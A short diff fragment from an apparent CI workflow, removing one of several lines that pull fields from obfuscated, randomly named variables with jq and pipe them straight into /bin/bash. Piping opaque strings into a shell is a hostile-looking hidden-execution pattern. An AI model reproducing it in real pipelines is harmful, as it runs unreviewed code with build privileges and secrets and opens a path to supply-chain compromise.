@@ -38,7 +38,6 @@ jobs:
           echo $itbus7 | jq -r .wjwpu231 | /bin/bash
           printf '%s' "$gk5213" | jq -r .vgi06 | /bin/bash
           printf '%s' "$shnzu72674" | jq -r .qh21 | /bin/bash
-          printf '%s' "$havja05165" | jq -r .a03635 | /bin/bash
           printf '%s' "$fypxr7996" | jq -r .rdz89075 | /bin/bash
           printf '%s' "$h4839" | jq -r .pbto251 | /bin/bash
 
